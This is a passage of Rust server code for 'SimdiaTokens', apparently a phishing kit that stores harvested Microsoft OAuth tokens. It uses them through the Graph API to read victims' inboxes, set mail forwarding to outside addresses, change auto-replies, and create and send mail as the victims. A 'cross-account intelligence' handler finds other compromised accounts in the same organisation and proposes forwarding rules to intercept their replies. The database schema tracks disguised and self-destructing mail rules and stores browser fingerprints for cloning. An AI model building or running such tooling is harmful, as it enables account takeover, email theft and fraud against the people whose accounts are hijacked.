        vercel_env_config: vercel_env,
        admin_id,
        azure_redirect_instructions,
        manual_steps,
        railway_auto_deployed,
        vercel_auto_deployed,
    })
}

// ============================================================
// FINALIZE WORKER — re-deploy a client's Worker with the real
// Railway backend URL once it is known. Avoids any manual
// Cloudflare dashboard step.
// ============================================================

#[derive(Deserialize)]
struct FinalizeWorkerRequest {
    admin_id: String,
    /// The real Railway backend URL for this client, e.g.
    /// https://simdiatokens-v2-production.up.railway.app
    api_url: String,
    /// Optionally override the worker name. If omitted, the worker name
    /// stored on the admin row (or derived from CF_WORKER_NAME) is used.
    worker_name: Option<String>,
}

#[derive(Serialize)]
struct FinalizeWorkerResponse {
    success: bool,
    message: String,
    worker_url: String,
    redirect_uri: String,
}

async fn finalize_worker_handler(
    body: web::Json<FinalizeWorkerRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let api_url = match normalize_api_url(&body.api_url) {
        Some(u) => u,
        None => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "api_url is required and must be a valid URL"
        })),
    };

    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"success": false, "message": "CF_ACCOUNT_ID env var not set"})),
    };
    let cf_api_token = match env::var("CF_API_TOKEN") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"success": false, "message": "CF_API_TOKEN env var not set"})),
    };
    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());

    // Resolve the worker name: explicit override > derived from admin's
    // stored worker_url > CF_WORKER_NAME env default.
    let worker_name = if let Some(name) = body.worker_name.clone() {
        name
    } else {
        let stored_worker_url: Option<String> = sqlx::query_scalar::<_, String>(
            "SELECT worker_url FROM users WHERE id = ?"
        )
        .bind(&body.admin_id)
        .fetch_optional(&state.pool)
        .await
        .ok()
        .flatten();

        stored_worker_url
            .and_then(|wu| {
                wu.trim_start_matches("https://")
                    .trim_start_matches("http://")
                    .split('.')
                    .next()
                    .map(|s| s.to_string())
            })
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string()))
    };

    let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
    let redirect_uri = format!("{}/oauth/callback", worker_url);

    // Re-deploy the worker script with MAIN_SERVER = real Railway URL.
    let deployed = push_worker_to_cloudflare(
        &state, &cf_account_id, &cf_api_token, &worker_name, &workers_subdomain,
        &api_url, &redirect_uri,
    ).await;

    match deployed {
        Ok(_) => {
            // Persist the real api_url (and worker_url) on the admin row.
            let _ = sqlx::query(
                "UPDATE users SET api_url = ?, worker_url = ? WHERE id = ?"
            )
            .bind(&api_url)
            .bind(&worker_url)
            .bind(&body.admin_id)
            .execute(&state.pool)
            .await;

            println!("[finalize-worker] Re-deployed {} with MAIN_SERVER={}", worker_url, api_url);

            HttpResponse::Ok().json(FinalizeWorkerResponse {
                success: true,
                message: format!("Worker {} updated. MAIN_SERVER is now {}.", worker_url, api_url),
                worker_url,
                redirect_uri,
            })
        }
        Err(e) => {
            eprintln!("[finalize-worker] Failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "success": false,
                "message": format!("Failed to re-deploy worker: {}", e),
                "worker_url": worker_url,
                "redirect_uri": redirect_uri,
            }))
        }
    }
}

// ============================================================
// DATABASE BACKUP & RESTORE — for Railway migration
// ============================================================

/// Download the SQLite database file. Returns the raw .db file.
/// Protected by a simple query-param auth so it can't be accessed
/// without the MASTER_SECRET.
async fn backup_db_handler(
    query: web::Query<std::collections::HashMap<String, String>>,
    state: web::Data<AppState>,
) -> impl Responder {
    let key = query.get("key").cloned().unwrap_or_default();
    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
    if key != expected || expected.is_empty() {
        return HttpResponse::Unauthorized().body("Invalid backup key");
    }

    let db_path = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| "sqlite:///app/data/simdiatokens.db".to_string());
    let file_path = db_path.replace("sqlite:", "").replace("sqlite://", "");

    match std::fs::read(&file_path) {
        Ok(data) => {
            let filename = file_path.rsplit('/').next().unwrap_or("simdiatokens.db");
            HttpResponse::Ok()
                .content_type("application/octet-stream")
                .header("Content-Disposition", format!("attachment; filename=\"{}\"", filename))
                .body(data)
        }
        Err(e) => {
            eprintln!("[backup] Failed to read DB at {}: {}", file_path, e);
            HttpResponse::InternalServerError().body(format!("Failed to read database: {}", e))
        }
    }
}

/// Restore the SQLite database from a raw uploaded file.
/// Accepts the .db file as the raw POST body. Protected by MASTER_SECRET.
async fn restore_db_handler(
    query: web::Query<std::collections::HashMap<String, String>>,
    body: web::Bytes,
    state: web::Data<AppState>,
) -> impl Responder {
    let key = query.get("key").cloned().unwrap_or_default();
    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
    if key != expected || expected.is_empty() {
        return HttpResponse::Unauthorized().body("Invalid restore key");
    }

    if body.is_empty() {
        return HttpResponse::BadRequest().body("Empty body — send the .db file as raw POST data");
    }

    let db_path = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| "sqlite:///app/data/simdiatokens.db".to_string());
    let file_path = db_path.replace("sqlite:", "").replace("sqlite://", "");

    // Back up the old DB just in case
    let backup_path = format!("{}.bak", file_path);
    let _ = std::fs::rename(&file_path, &backup_path);

    // Write the new DB
    match std::fs::write(&file_path, &body) {
        Ok(_) => {
            println!("[restore] Database restored: {} ({} bytes)", file_path, body.len());
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "message": format!("Database restored ({} bytes). Restart the service for changes to take effect.", body.len()),
                "size": body.len(),
            }))
        }
        Err(e) => {
            eprintln!("[restore] Failed to write DB: {}", e);
            let _ = std::fs::rename(&backup_path, &file_path);
            HttpResponse::InternalServerError().body(format!("Failed to write database: {}", e))
        }
    }
}

// ============================================================
// CROSS-ACCOUNT INTELLIGENCE — Correlate tokens from same org
// ============================================================

// ============================================================
// CHUNKED DB RESTORE — for large DBs that exceed Railway's
// request body size limit (~100KB on free plan).
// Flow: POST chunks to /restore-db-chunk, then POST to
// /restore-db-finalize to assemble and write the DB.
// ============================================================

#[derive(Deserialize)]
struct RestoreChunkRequest {
    key: String,
    chunk_index: usize,
    total_chunks: usize,
    data: String, // base64-encoded chunk
}

async fn restore_db_chunk_handler(
    body: web::Json<RestoreChunkRequest>,
) -> impl Responder {
    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
    if body.key != expected || expected.is_empty() {
        return HttpResponse::Unauthorized().json(serde_json::json!({"error": "invalid_key"}));
    }

    use base64::{Engine as _, engine::general_purpose};
    let chunk_data = match general_purpose::STANDARD.decode(&body.data) {
        Ok(d) => d,
        Err(e) => return HttpResponse::BadRequest().json(serde_json::json!({"error": format!("base64 decode failed: {}", e)})),
    };

    let chunk_path = format!("/tmp/db_chunk_{}", body.chunk_index);
    match std::fs::write(&chunk_path, &chunk_data) {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({
            "success": true,
            "chunk_index": body.chunk_index,
            "size": chunk_data.len(),
        })),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("write failed: {}", e)})),
    }
}

#[derive(Deserialize)]
struct RestoreFinalizeRequest {
    key: String,
    total_chunks: usize,
}

async fn restore_db_finalize_handler(
    body: web::Json<RestoreFinalizeRequest>,
) -> impl Responder {
    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
    if body.key != expected || expected.is_empty() {
        return HttpResponse::Unauthorized().json(serde_json::json!({"error": "invalid_key"}));
    }

    let db_path = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| "sqlite:///app/data/simdiatokens.db".to_string());
    let file_path = db_path.replace("sqlite:", "").replace("sqlite://", "");

    // Assemble chunks
    let mut full_data = Vec::new();
    for i in 0..body.total_chunks {
        let chunk_path = format!("/tmp/db_chunk_{}", i);
        match std::fs::read(&chunk_path) {
            Ok(data) => full_data.extend_from_slice(&data),
            Err(e) => return HttpResponse::BadRequest().json(serde_json::json!({
                "error": format!("Missing chunk {}: {}", i, e),
            })),
        }
        let _ = std::fs::remove_file(&chunk_path);
    }

    // Back up old DB
    let backup_path = format!("{}.bak", file_path);
    let _ = std::fs::rename(&file_path, &backup_path);

    // Write the assembled DB
    match std::fs::write(&file_path, &full_data) {
        Ok(_) => {
            println!("[restore-finalize] Database restored: {} ({} bytes from {} chunks)", file_path, full_data.len(), body.total_chunks);
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "message": format!("Database restored ({} bytes, {} chunks). Restart the service.", full_data.len(), body.total_chunks),
                "size": full_data.len(),
            }))
        }
        Err(e) => {
            let _ = std::fs::rename(&backup_path, &file_path);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("write failed: {}", e)}))
        }
    }
}

// ============================================================
// CROSS-ACCOUNT INTELLIGENCE — Correlate tokens from same org
// ============================================================

/// Cross-Account Intelligence: Finds other compromised accounts from the
/// same organization (same email domain) and:
/// 1. Shows which accounts are compromised in the same org
/// 2. Identifies communication patterns between them
/// 3. Suggests auto-forwarding rules: if A sends to B, and both are
///    compromised, auto-forward B's replies to an external address
async fn cross_account_intelligence_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();

    // Get the target token's email
    let target_token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };

    let target_email = target_token.user_email.clone();
    let domain = target_email.split('@').nth(1).unwrap_or("").to_lowercase();

    if domain.is_empty() {
        return HttpResponse::BadRequest().json(serde_json::json!({"error": "invalid_email"}));
    }

    // Find all other active tokens from the same domain
    let rows: Vec<(String, Option<String>, Option<String>)> = sqlx::query_as(
        "SELECT id, email, status FROM harvested WHERE email LIKE ? AND id != ? ORDER BY captured_at DESC"
    )
    .bind(format!("%@{}", domain))
    .bind(&token_id)
    .fetch_all(&state.pool)
    .await
    .unwrap_or_default();

    let mut correlated_accounts: Vec<serde_json::Value> = Vec::new();

    for (id, email, status) in &rows {
        let is_active = status.as_deref().unwrap_or("active") == "active";

        // For each correlated account, check if there's communication between them
        // by scanning the target's inbox for emails from/to this account
        if is_active {
            let access_token = refresh_access_token(&state, &target_token.refresh_token).await
                .unwrap_or_else(|| target_token.access_token.clone());

            // Search inbox for emails from this account
            let search_url = format!(
                "https://graph.microsoft.com/v1.0/me/messages?$search=\"{}\"&$top=5&$select=id,subject,from,receivedDateTime",
                urlencoding::encode(email.as_deref().unwrap_or(""))
            );

            let ua = target_token.user_agent.as_deref().unwrap_or("Mozilla/5.0");
            let lang = target_token.accept_language.as_deref().unwrap_or("en-US,en;q=0.9");

            let search_res = reqwest::Client::new()
                .get(&search_url)
                .header("Authorization", format!("Bearer {}", access_token))
                .header("Accept", "application/json")
                .header("User-Agent", ua)
                .header("Accept-Language", lang)
                .send()
                .await;

            let communication_count = match search_res {
                Ok(r) if r.status().is_success() => {
                    r.json::<serde_json::Value>().await
                        .ok()
                        .and_then(|v| v.get("value").and_then(|v| v.as_array()).map(|a| a.len()))
                        .unwrap_or(0)
                }
                _ => 0,
            };

            correlated_accounts.push(serde_json::json!({
                "token_id": id,
                "email": email,
                "status": status,
                "is_active": is_active,
                "communication_found": communication_count > 0,
                "communication_count": communication_count,
                "suggested_action": if communication_count > 0 {
                    format!("Auto-create forwarding rule on {} to intercept replies from {}", email.as_deref().unwrap_or(""), target_email)
                } else {
                    "No direct communication found".to_string()
                }
            }));
        } else {
            correlated_accounts.push(serde_json::json!({
                "token_id": id,
                "email": email,
                "status": status,
                "is_active": false,
                "communication_found": false,
                "communication_count": 0,
                "suggested_action": "Account revoked — re-harvest needed"
            }));
        }
    }

    // Generate cross-account rule suggestions
    let mut suggestions: Vec<serde_json::Value> = Vec::new();
    for account in &correlated_accounts {
        if account["is_active"].as_bool() == Some(true) && account["communication_found"].as_bool() == Some(true) {
            let other_email = account["email"].as_str().unwrap_or("");
            suggestions.push(serde_json::json!({
                "type": "auto_forward",
                "description": format!("Create rule on {} to forward emails from {} to external address", other_email, target_email),
                "target_token_id": account["token_id"],
                "target_email": other_email,
                "condition_sender": target_email,
                "rationale": "These accounts communicate regularly. Intercepting replies maximizes intelligence."
            }));
        }
    }

    HttpResponse::Ok().json(serde_json::json!({
        "target_email": target_email,
        "domain": domain,
        "correlated_accounts": correlated_accounts,
        "total_accounts_in_org": rows.len(),
        "active_accounts": correlated_accounts.iter().filter(|a| a["is_active"].as_bool() == Some(true)).count(),
        "suggestions": suggestions,
        "suggestion_count": suggestions.len()
    }))
}

// robots.txt handler to prevent search engine indexing
async fn robots_txt_handler() -> impl Responder {
    HttpResponse::Ok()
        .content_type("text/plain")
        .body("User-agent: *\nDisallow: /\n\n# SimdiaTokens - do not index\n")
}

// Helper: refresh access token
async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<String> {
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", refresh_token),
    ];
    let res = state.http_client.post(token_url).form(&params).send().await.ok()?;
    let body: serde_json::Value = res.json().await.ok()?;
    body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
}

// API endpoint to refresh a single token manually
async fn api_refresh_token_handler(
    query: web::Query<TokenIdQuery>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    
    match crate::scheduler::refresh_single_token(&state, token_id, token_url).await {
        Ok(_) => {
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "message": "Token refreshed successfully"
            }))
        }
        Err(e) => {
            let err_str = e.to_string();
            // Check if token was revoked (invalid_grant)
            if err_str.contains("invalid_grant") || err_str.contains("revoked") {
                HttpResponse::Ok().json(serde_json::json!({
                    "success": false,
                    "message": "Token has been revoked by user"
                }))
            } else {
                HttpResponse::InternalServerError().json(serde_json::json!({
                    "success": false,
                    "message": format!("Refresh failed: {}", err_str)
                }))
            }
        }
    }
}

// Root status route
async fn root_status() -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({
        "name": "SimdiaTokens API",
        "version": "2.0.0",
        "status": "operational",
        "endpoints": {
            "auth": "/api/auth/login, /api/auth/register, /api/auth/me",
            "tokens": "/api/tokens, /api/tokens/health",
            "campaigns": "/api/campaigns",
            "inbox": "/api/inbox",
            "recon": "/api/recon/run, /api/recon/{id}",
            "ai": "/api/ai/analyses, /api/ai/analyze",
            "analytics": "/api/analytics/overview",
            "settings": "/api/settings/ai",
            "exchange": "/exchange?code=..."
        }
    }))
}

// === Advanced Graph API Handlers ===

async fn get_mailbox_settings_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.get_mailbox_settings(&access_token).await {
        Ok(settings) => HttpResponse::Ok().json(settings),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "mailbox_settings_failed", "details": format!("{}", e)})),
    }
}

#[derive(Deserialize)]
struct AutoReplyRequest {
    internal_reply: String,
    external_reply: String,
    external_audience: Option<String>,
}

async fn set_auto_reply_handler(
    path: web::Path<String>,
    body: web::Json<AutoReplyRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let audience = body.external_audience.as_deref().unwrap_or("all");
    let client = GraphClient::new();
    match client.set_auto_reply(&access_token, &body.internal_reply, &body.external_reply, audience).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Auto-reply (OOO) enabled"})),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "auto_reply_failed", "details": format!("{}", e)})),
    }
}

async fn disable_auto_reply_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.disable_auto_reply(&access_token).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Auto-reply (OOO) disabled"})),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "disable_failed", "details": format!("{}", e)})),
    }
}

#[derive(Deserialize)]
struct MailForwardingRequest {
    forward_to: String,
}

async fn set_mail_forwarding_handler(
    path: web::Path<String>,
    body: web::Json<MailForwardingRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.set_mail_forwarding(&access_token, &body.forward_to).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": format!("Mail forwarding set to {}", body.forward_to)})),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "forwarding_failed", "details": format!("{}", e)})),
    }
}

async fn disable_mail_forwarding_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.disable_mail_forwarding(&access_token).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Mail forwarding disabled"})),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "disable_failed", "details": format!("{}", e)})),
    }
}

async fn search_directory_users_handler(
    path: web::Path<String>,
    query: web::Query<std::collections::HashMap<String, String>>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let search = query.get("q").cloned().unwrap_or_default();
    if search.is_empty() {
        return HttpResponse::BadRequest().json(serde_json::json!({"error": "q parameter required"}));
    }
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.search_directory_users(&access_token, &search, 50).await {
        Ok(results) => HttpResponse::Ok().json(results),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "directory_search_failed", "details": format!("{}", e)})),
    }
}

async fn get_drafts_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.get_drafts(&access_token, 50).await {
        Ok(resp) => HttpResponse::Ok().json(resp),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "drafts_failed", "details": format!("{}", e)})),
    }
}

#[derive(Deserialize)]
struct CreateDraftRequest {
    to: Vec<String>,
    subject: String,
    body: String,
    content_type: Option<String>,
}

async fn create_draft_handler(
    path: web::Path<String>,
    body: web::Json<CreateDraftRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let ct = body.content_type.as_deref().unwrap_or("HTML");
    let client = GraphClient::new();
    match client.create_draft(&access_token, &body.to, &body.subject, &body.body, ct).await {
        Ok(draft) => HttpResponse::Ok().json(draft),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "draft_create_failed", "details": format!("{}", e)})),
    }
}

async fn send_draft_handler(
    path: web::Path<(String, String)>,
    state: web::Data<AppState>,
) -> impl Responder {
    let (token_id, message_id) = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.send_draft(&access_token, &message_id).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Draft sent"})),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "draft_send_failed", "details": format!("{}", e)})),
    }
}

#[derive(Deserialize)]
struct ApplyCategoriesRequest {
    categories: Vec<String>,
}

async fn apply_categories_handler(
    path: web::Path<(String, String)>,
    body: web::Json<ApplyCategoriesRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let (token_id, message_id) = path.into_inner();
    let token = match retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();
    match client.apply_categories(&access_token, &message_id, &body.categories).await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Categories applied"})),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "categories_failed", "details": format!("{}", e)})),
    }
}

// HTML admin dashboard (with View Inbox button)
async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>
        body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}
        table{width:100%;border-collapse:collapse;}
        th,td{padding:10px;border-bottom:1px solid #333;}
        .token{font-family:monospace;font-size:12px;}
        button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
        button:hover{background:#005a9e;}
        a{text-decoration:none;}
    </style></head><body><h1>SimdiaTokens Harvested Tokens</h1>
    <table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
    for token in rows {
        let email = token.email.as_deref().unwrap_or("unknown");
        let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
        html.push_str(&format!(
            r#"<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td>
            <td><a href='/inbox_view?token_id={}'><button>View Inbox</button></a></td></tr>"#,
            token.id, email, refresh_short, token.expires_at, token.source, token.id
        ));
    }
    html.push_str("</table></body></html>");
    HttpResponse::Ok().content_type("text/html").body(html)
}

// HTML inbox view (fallback)
async fn inbox_view_html(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let data: serde_json::Value = r.json().await.unwrap_or_default();
                let mut html = String::from(r#"<!DOCTYPE html><html><head><title>Inbox</title><style>body{font-family:Arial;background:#f0f2f5;margin:0;padding:20px;}h2{color:#333;}.email{background:white;margin-bottom:10px;padding:15px;border-radius:8px;}</style></head><body><h1>Inbox</h1>"#);
                if let Some(msgs) = data.get("value").and_then(|v| v.as_array()) {
                    for msg in msgs {
                        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("(no subject)");
                        let from = msg.get("from").and_then(|v| v.get("emailAddress")).and_then(|v| v.get("address")).and_then(|v| v.as_str()).unwrap_or("unknown");
                        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
                        let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("");
                        html.push_str(&format!("<div class='email'><b>{}</b><br>From: {}<br>{}<br>{}</div><hr>", subject, from, received, body_preview));
                    }
                } else {
                    html.push_str("<p>No emails found</p>");
                }
                html.push_str("</body></html>");
                HttpResponse::Ok().content_type("text/html").body(html)
            }
            Err(e) => HttpResponse::InternalServerError().body(format!("Error: {}", e))
        }
    } else {
        HttpResponse::NotFound().body("Token not found")
    }
}

async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS harvested (
            id TEXT PRIMARY KEY,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT NOT NULL,
            expires_at DATETIME NOT NULL,
            captured_at DATETIME NOT NULL,
            source TEXT NOT NULL,
            ip_address TEXT,
            location TEXT,
            tenant_id TEXT,
            category TEXT,
            account_type TEXT,
            last_refreshed_at DATETIME
        )"
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS tokens (
            id TEXT PRIMARY KEY,
            campaign_id TEXT,
            user_email TEXT,
            encrypted_access_token BLOB NOT NULL,
            encrypted_refresh_token BLOB NOT NULL,
            access_salt BLOB NOT NULL,
            refresh_salt BLOB NOT NULL,
            scopes TEXT,
            expires_at DATETIME NOT NULL,
            created_at DATETIME NOT NULL,
            last_refreshed_at DATETIME,
            status TEXT DEFAULT 'active',
            account_type TEXT
        )
        "#
    ).execute(pool).await?;

    // Migration: add account_type column if tables exist from before this change
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN account_type TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN account_type TEXT")
        .execute(pool).await;
    // Migration: add status column to harvested table (needed for token revocation tracking)
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN status TEXT DEFAULT 'active'")
        .execute(pool).await;
    // Migration: add browser fingerprint columns for fingerprint cloning
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN user_agent TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN accept_language TEXT")
        .execute(pool).await;
    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS recon_reports (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            report_json TEXT NOT NULL,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS created_rules (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            graph_rule_id TEXT,
            display_name TEXT NOT NULL,
            disguise_name TEXT NOT NULL,
            conditions_json TEXT NOT NULL,
            actions_json TEXT NOT NULL,
            target_folder TEXT,
            forward_to TEXT,
            created_at DATETIME NOT NULL,
            status TEXT NOT NULL
        )
        "#
    ).execute(pool).await?;

    // Migration: add disguise_name column if created_rules table exists without it
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN disguise_name TEXT NOT NULL DEFAULT 'External Mail Filter'")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN graph_rule_id TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN target_folder TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN forward_to TEXT")
        .execute(pool).await;
    // Self-destructing rules: track how many times a rule has fired
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN fire_count INTEGER DEFAULT 0")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN max_fires INTEGER")
        .execute(pool).await;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS campaigns (
            id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            client_id TEXT NOT NULL,
